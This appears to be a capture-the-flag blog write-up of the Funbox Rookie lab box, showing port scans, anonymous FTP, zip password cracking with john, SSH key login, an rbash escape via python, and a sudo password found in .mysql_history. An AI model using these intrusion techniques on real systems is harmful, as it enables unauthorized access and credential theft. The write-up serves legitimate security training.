---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/funbox-rookie,520/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

Starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 192.168.214.107                                                                                                                                                                                                          130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-13 04:00 EST
Nmap scan report for 192.168.214.107
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds

$ nmap -Pn -p21,22,80 -sV 192.168.214.107                                                                                                                                                                                           130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-13 04:02 EST
Nmap scan report for 192.168.214.107
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
```

## dir busting
```bash
$ gobuster dir -u http://192.168.214.107/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.214.107/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/01/13 04:03:07 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/index.html           (Status: 200) [Size: 10918]
/robots.txt           (Status: 200) [Size: 17]   
                                                 
===============================================================
2023/01/13 04:11:06 Finished
===============================================================
```

---

# exploitation
## anonymous ftp
```bash
$ ftp 192.168.214.107                                                                                                                                                                                                                 1 ⨯
Connected to 192.168.214.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.214.107]
Name (192.168.214.107:void): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.49.214 !
230-
230-The local time is: Fri Jan 13 09:03:22 2023
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

> Anonymous access is possible!
{: .prompt-info }

Inspecting the `FTP` server reveals the following folders and documents.
```bash
ftp> dir -a
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 .
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 ..
-rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
```

Lets start with downloading the file `.@admins` and have a look at its content.
```bash
ftp> get .@admins
local: .@admins remote: .@admins
200 PORT command successful
150 Opening BINARY mode data connection for .@admins (153 bytes)
226 Transfer complete
153 bytes received in 0.00 secs (84.7499 kB/s)

$ cat .@admins 
SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290
$ cat .@admins | base64 -d
Hi Admins,

be carefull with your keys. Find them in %yourname%.zip.
The passwords are the old ones.

Regards
root
```

> So, there should be sensitive information inside the `zip` files.
{: .prompt-info }

In the next step we download every `zip` file.
```bash
ftp> get anna.zip
local: anna.zip remote: anna.zip
200 PORT command successful
150 Opening BINARY mode data connection for anna.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (1.3570 MB/s)
ftp> get ariel.zip
local: ariel.zip remote: ariel.zip
200 PORT command successful
150 Opening BINARY mode data connection for ariel.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (765.5959 kB/s)
ftp> get bud.zip
local: bud.zip remote: bud.zip
200 PORT command successful
150 Opening BINARY mode data connection for bud.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (1.1565 MB/s)
ftp> get cathrine.zip
local: cathrine.zip remote: cathrine.zip
200 PORT command successful
150 Opening BINARY mode data connection for cathrine.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (2.7245 MB/s)
ftp> get homer.zip
local: homer.zip remote: homer.zip
200 PORT command successful
150 Opening BINARY mode data connection for homer.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (1.2019 MB/s)
ftp> get jessica.zip
local: jessica.zip remote: jessica.zip
200 PORT command successful
150 Opening BINARY mode data connection for jessica.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (775.4747 kB/s)
ftp> get john.zip
local: john.zip remote: john.zip
200 PORT command successful
150 Opening BINARY mode data connection for john.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (604.7726 kB/s)
ftp> get marge.zip
local: marge.zip remote: marge.zip
200 PORT command successful
150 Opening BINARY mode data connection for marge.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (1.1242 MB/s)
ftp> get miriam.zip
local: miriam.zip remote: miriam.zip
200 PORT command successful
150 Opening BINARY mode data connection for miriam.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (1.7136 MB/s)
ftp> get tom.zip
local: tom.zip remote: tom.zip
200 PORT command successful
150 Opening BINARY mode data connection for tom.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (1.0403 MB/s)
ftp> get zlatan.zip
local: zlatan.zip remote: zlatan.zip
200 PORT command successful
150 Opening BINARY mode data connection for zlatan.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (795.5779 kB/s)
```

> The `zip` files are password protected.
{: .prompt-danger }

In the next step we use `zip2john` to generate the password hashes of the `zip` files and write them into a file named `hashes.txt`
```bash
$ zip2john anna.zip > hashes.txt
$ zip2john ariel.zip >> hashes.txt
$ zip2john bud.zip >> hashes.txt
$ zip2john cathrine.zip >> hashes.txt
$ zip2john homer.zip >> hashes.txt
$ zip2john jessica.zip >> hashes.txt
$ zip2john john.zip >> hashes.txt
$ zip2john marge.zip >> hashes.txt
$ zip2john miriam.zip >> hashes.txt
$ zip2john tom.zip >> hashes.txt
$ zip2john zlatan.zip >> hashes.txt
```

Try to break the hashes via `john`
```bash
$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iubire           (tom.zip/id_rsa)     
catwoman         (cathrine.zip/id_rsa)     
2g 0:00:00:03 DONE (2023-01-13 04:16) 0.5952g/s 4268Kp/s 4271Kc/s 4271KC/s !LUVDKR!..*7¡Vamos!
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

> We found two passwords! `tom.zip:iubire` and `cathrine.zip:catwoman`.
{: .prompt-info }

Lets unzip the `zip` files to get the `id_rsa` keys we probably can use to log into the system via `ssh`.
```bash
$ unzip tom.zip         
Archive:  tom.zip
[tom.zip] id_rsa password: 
  inflating: id_rsa

$ mv id_rsa id_rsa_tom
$ chmod 600 id_rsa_tom

$ unzip cathrine.zip 
Archive:  cathrine.zip
[cathrine.zip] id_rsa password: 
  inflating: id_rsa

$ mv id_rsa id_rsa_cathrine
$ chmod 600 id_rsa_cathrine
```

Check if we can log in with the private keys.
```bash
$ ssh -i id_rsa_cathrine cathrine@192.168.214.107
Connection closed by 192.168.214.107 port 22

$ ssh -i id_rsa_tom tom@192.168.214.107       
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 13 09:31:20 UTC 2023

  System load:  0.0               Processes:             165
  Usage of /:   74.7% of 4.37GB   Users logged in:       0
  Memory usage: 36%               IP address for ens256: 192.168.214.107
  Swap usage:   0%


30 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jan 13 09:19:26 2023 from 192.168.49.214
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

> Logging in with `tom` works!
{: .prompt-info }

---

# post exploitation
## get first flag
```bash
tom@funbox2:~$ ls
local.txt

tom@funbox2:~$ cat local.txt
a******************************f
```

## rbash
```bash
tom@funbox2:~$ cd ..
-rbash: cd: restricted
```

> Trying to `cd` out of the directory reveals that we are jailed in a restricted bash.
{: .prompt-danger }

In the next step we escape `rbash` by using `python`.

```bash
tom@funbox2:~$ python3
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system('/bin/bash')
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ cd ..
tom@funbox2:/home$
```

> We now have a full `bash` shell :-)
{: .prompt-info }

## privilege escalation
```bash
tom@funbox2:~$ ls -lsah
total 52K
4.0K drwxr-xr-x 6 tom  tom  4.0K Jan 13 09:44 .
4.0K drwxr-xr-x 3 root root 4.0K Jul 25  2020 ..
4.0K -rw------- 1 tom  tom   289 Jan 13 09:42 .bash_history
4.0K -rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
4.0K -rw-r--r-- 1 tom  tom  3.7K Apr  4  2018 .bashrc
4.0K drwx------ 2 tom  tom  4.0K Jan 13 09:19 .cache
4.0K drwxr-x--- 3 tom  tom  4.0K Jan 13 09:44 .config
4.0K drwx------ 3 tom  tom  4.0K Jan 13 09:44 .gnupg
4.0K -rw-r--r-- 1 tom  tom    33 Jan 13 09:00 local.txt
4.0K -rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
4.0K -rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
4.0K -rw------- 1 tom  tom    45 Jan 13 09:42 .python_history
4.0K drwx------ 2 tom  tom  4.0K Jul 25  2020 .ssh
```

Lets have a look into the file `.mysql_history`.
```bash
tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

> We found a password for the user tom! `tom:xx11yy22!`
{: .prompt-info }

Lets check if we are allowed to execute commands with `sudo` by using the identified password.
```bash
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
```

> Yes! We are allowed to execute all commands with `sudo`!
{: .prompt-info }

Lets switch to user `root`
```bash
tom@funbox2:~$ sudo su
root@funbox2:/home/tom# id
uid=0(root) gid=0(root) groups=0(root)
```

> We are `root` now :-)
{: .prompt-info }

## get second flag
```bash
root@funbox2:/home/tom# cd /root
root@funbox2:~# ls -lsah
total 32K
4.0K drwx------  4 root root 4.0K Jan 13 09:00 .
4.0K drwxr-xr-x 24 root root 4.0K Oct 14  2020 ..
   0 -rw-------  1 root root    0 Oct 14  2020 .bash_history
4.0K -rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
4.0K -rw-r--r--  1 root root   32 Oct 14  2020 flag.txt
4.0K drwx------  3 root root 4.0K Sep 15  2020 .gnupg
4.0K -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4.0K -rw-------  1 root root   33 Jan 13 09:00 proof.txt
4.0K drwx------  2 root root 4.0K Jul 25  2020 .ssh
root@funbox2:~# cat proof.txt
d******************************f
```

Pwned! <@:-)
